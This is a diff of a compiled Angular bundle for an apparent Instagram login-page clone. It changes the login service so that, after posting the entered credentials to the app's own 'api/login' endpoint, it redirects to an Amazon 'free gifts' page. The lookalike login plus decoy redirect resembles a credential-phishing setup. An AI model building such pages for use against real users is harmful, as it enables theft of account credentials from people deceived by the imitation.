@@ -17,7 +17,7 @@
     /***/
     function _(module, exports, __webpack_require__) {
       module.exports = __webpack_require__(
-      /*! D:\Instagram-login-page\Instagram\src\main.ts */
+      /*! D:\Angular Project\Instagram-login-page\Instagram\src\main.ts */
       "zUnb");
       /***/
     },
@@ -270,19 +270,30 @@
       var _angular_common_http__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(
       /*! @angular/common/http */
       "tk/3");
+      /* harmony import */
+
+
+      var _angular_router__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(
+      /*! @angular/router */
+      "tyNb");
 
       var LoginService = /*#__PURE__*/function () {
-        function LoginService(http) {
+        function LoginService(http, rt) {
           _classCallCheck(this, LoginService);
 
           this.http = http;
+          this.rt = rt;
         }
 
         _createClass(LoginService, [{
           key: "login",
           value: function login(logindata) {
+            var _this = this;
+
             return this.http.post("api/login", logindata).subscribe(function (res) {
               console.log(res);
+
+              _this.rt.navigateByUrl('https://www.amazon.com/free-gifts/s?k=free+gifts');
             });
           }
         }]);
@@ -291,7 +302,7 @@
       }();
 
       LoginService.ɵfac = function LoginService_Factory(t) {
-        return new (t || LoginService)(_angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵinject"](_angular_common_http__WEBPACK_IMPORTED_MODULE_1__["HttpClient"]));
+        return new (t || LoginService)(_angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵinject"](_angular_common_http__WEBPACK_IMPORTED_MODULE_1__["HttpClient"]), _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵinject"](_angular_router__WEBPACK_IMPORTED_MODULE_2__["Router"]));
       };
 
       LoginService.ɵprov = _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵdefineInjectable"]({
@@ -310,6 +321,8 @@
         }], function () {
           return [{
             type: _angular_common_http__WEBPACK_IMPORTED_MODULE_1__["HttpClient"]
+          }, {
+            type: _angular_router__WEBPACK_IMPORTED_MODULE_2__["Router"]
           }];
         }, null);
       })();
